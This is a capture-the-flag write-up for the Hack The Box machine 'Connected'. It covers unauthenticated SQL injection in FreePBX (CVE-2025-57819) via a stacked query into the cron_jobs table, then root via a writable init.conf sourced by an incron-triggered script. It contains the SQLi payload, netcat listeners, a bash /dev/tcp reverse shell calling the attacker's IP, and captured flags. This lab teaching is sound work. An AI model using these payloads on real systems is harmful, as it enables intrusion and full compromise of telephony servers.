# Connected (HTB) — Detailed Notes (English)

**Target:** 10.129.245.100 (connected.htb) **Box type:** FreePBX-based Linux machine

---

## 1. Background Concepts (for beginners)

Before diving in, four ideas need to be clear:

- **FreePBX** is a web-based control panel used to manage **Asterisk** (an open-source phone/PBX system). Think of it as the "control room" of an office telephone exchange — it routes calls and manages extensions.
- **SQL Injection (SQLi)**: when a website takes user input and pastes it directly into a database query without sanitizing it, an attacker can inject their own SQL code. Example: a form expects a name like "Ali", but if you type `Ali'; DROP TABLE users;--` and the app concatenates that straight into the query, your injected code executes too.
- **Stacked queries**: some database setups let you run more than one SQL statement in a single request, separated by a semicolon (`;`) — like placing two orders in one breath. This is the core trick on this box: break the original query, then append your own `INSERT` statement.
- **Cron job**: a "scheduled task" the system runs automatically every X minutes/seconds (like an alarm clock that rings every minute and does something). FreePBX has its own `cron_jobs` database table that it polls every minute.

The exploit chain used here is: **Unauthenticated SQLi → stacked query inserts a malicious entry into `cron_jobs` → FreePBX's own cron check executes that entry → we get a shell (RCE).**

---

## 2. Technologies Table

|Component|Role|
|---|---|
|FreePBX 16.0.40.7|Vulnerable web application (PBX admin panel)|
|MariaDB/MySQL|Backend database, stacked queries allowed|
|Asterisk|Underlying telephony engine, service user `asterisk`|
|cron / `cron_jobs` table|FreePBX's own scheduling mechanism, abused for RCE|
|incron|inotify-based cron — triggers on file/directory changes, used for privilege escalation|

---

## 3. Vulnerability: CVE-2025-57819

- FreePBX's **Endpoint module** does not sanitize the `brand` parameter — it is concatenated directly into a SQL query.
- The database allows stacked queries, so an attacker can append their own `INSERT` statement.
- This CVE is listed in **CISA's Known Exploited Vulnerabilities (KEV)** catalog, meaning it has been exploited in the wild.

### Payload concept

```sql
x'; INSERT INTO cron_jobs (modulename, jobname, command, class, schedule, max_runtime, enabled, execution_order)
VALUES ('sysadmin', 'pwn', '<command>', NULL, '* * * * *', 30, 1, 1) -- -
```

Here `x'` closes/breaks the original query, `;` starts a new statement, then our `INSERT` runs, and `-- -` comments out the remainder of the original query.

`* * * * *` means "run every minute" — so the trigger takes roughly 60 seconds to fire.

---

## 4. Beginner-to-Box Progression

Explained step by step, as if teaching someone with no prior context:

1. **Identify the target**: `nmap` scan showed ports 80/443 running a web service, identified as FreePBX 16.0.40.7.
    
2. **Match the version to a known vulnerability**: research confirmed this version is affected by CVE-2025-57819.
    
3. **Find a public PoC**: GitHub hosts ready-made exploit scripts such as `Its1Zero/cve-2025-57819-exploit` — no need to hand-write the payload, just understand correct usage.
    
4. **Set up a listener and run the exploit**:
    
    ```bash
    nc -lnvp 4444
    python3 exploit.py connected.htb 10.10.14.254 4444
    ```
    
    > Note: pass a bare hostname, not `http://` or a path like `/admin/` — the script builds the request path internally.
    
5. **Stabilize the shell** (so it survives Ctrl+C and behaves like a normal terminal):
    
    ```bash
    python -c 'import pty;pty.spawn("/bin/bash")'
    # Ctrl+Z
    stty raw -echo; fg
    export TERM=xterm
    ```
    
6. **Captured user.txt**: `c81884844c4c56e60da63462bcccb8e1`
    

At this point we are only the **asterisk** user, not root. Next comes privilege escalation.

---

## 5. Privilege Escalation — Process and Reasoning

### 5.1 Initial enumeration

```bash
find / -perm -u=s -type f 2>/dev/null
```

This command finds files with the **SUID bit** set — meaning whoever runs the file, it executes with the file owner's (often root's) permissions. Most results were standard CentOS 7 entries, but `/usr/bin/incrontab` hinted that **incron** was active on this box.

### 5.2 Understanding incron

`incron` reacts to file-system events (a file being written or changed) rather than time, like cron but event-driven. If root has configured a rule such as "when this file changes, run this root-owned script," and that watched file happens to be writable by us (the `asterisk` user), we can trigger that root script — and through it, whatever it does will run with root's permissions.

```bash
cat /etc/incron.d/* 2>/dev/null
```

Output included this rule:

```
/var/spool/asterisk/sysadmin/dahdi_restart  IN_CLOSE_WRITE  /usr/sbin/sysadmin_dahdi_restart
```

Meaning: whenever `.../dahdi_restart` is written and closed (`IN_CLOSE_WRITE`), root runs `/usr/sbin/sysadmin_dahdi_restart`.

### 5.3 A failed attempt first (important learning point)

The first approach tried was the `sysadmin_manager` / `fwconsole-commands` hook — crafting a specially-named file (`api.fwconsole-commands.<base64(zlib(json))>`) dropped into `/var/spool/asterisk/incron/`. This did not work. Checking:

```bash
ps aux | grep incron
```

showed no active `incrond` process firing that rule at the time, or the hook format didn't match what the target expected. **Lesson**: when one privilege escalation path fails, look for an alternate confirmed rule rather than relying on a single avenue.

### 5.4 The successful path — dahdi_restart + init.conf

`/usr/sbin/sysadmin_dahdi_restart` internally runs `/etc/init.d/dahdi restart`, and that init script **sources** `/etc/dahdi/init.conf` (meaning any shell commands inside that file are executed as if pasted directly into the root-run script).

Confirmed the file was writable by `asterisk`:

```bash
ls -la /etc/dahdi/init.conf
```

Appended a reverse shell command to it:

```bash
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.254/4445 0>&1" &' >> /etc/dahdi/init.conf
```

Set up a listener:

```bash
nc -lvnp 4445
```

Then triggered the watched file:

```bash
echo 'restart' > /var/spool/asterisk/sysadmin/dahdi_restart
```

Within seconds, `incrond` fired the root script, which sourced `init.conf` — executing our appended command with root privileges.

### 5.5 Root obtained

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
# 5174b7266e75c0cdd4c0a6200dd9c262
```

---

## 6. Core Takeaway (with analogy)

The central lesson from this box: **"if a privileged (root) process reads or sources a file that a lower-privileged user can write, that file becomes a hidden privilege escalation vector."**

Real-life analogy: imagine a manager (root) reads their daily report from a shared folder every day, and that folder is writable by all employees (a low-privilege user like `asterisk`). If an employee edits that report file and the manager blindly follows whatever is written without verifying it, the employee is effectively controlling the manager's actions — without ever becoming the manager themselves.

---

## 7. Full Command Walkthrough (with "why")

|Command|Why it was run|
|---|---|
|`nmap -sC -sV -p- 10.129.245.100`|Identify open ports and services|
|`python3 exploit.py connected.htb 10.10.14.254 4444`|Run CVE-2025-57819 exploit — SQLi → cron_jobs insert → RCE|
|`nc -lnvp 4444`|Listener to catch the reverse shell|
|`python -c 'import pty;pty.spawn("/bin/bash")'`|Upgrade to an interactive, stable shell|
|`find / -perm -u=s -type f 2>/dev/null`|Find SUID binaries — potential privesc leads|
|`cat /etc/incron.d/* 2>/dev/null`|Inspect root-owned incron rules — which watched files trigger root actions|
|`ls -la /etc/dahdi/init.conf`|Confirm the file is writable by `asterisk`|
|`echo '...' >> /etc/dahdi/init.conf`|Hide a reverse shell command inside a file root will source|
|`echo 'restart' > /var/spool/asterisk/sysadmin/dahdi_restart`|Trigger the incron rule so the root script runs|
|`cat /root/root.txt`|Final proof — root access confirmed|

---

_Notes by: Obito Uchiha — Team AKATSUKI_
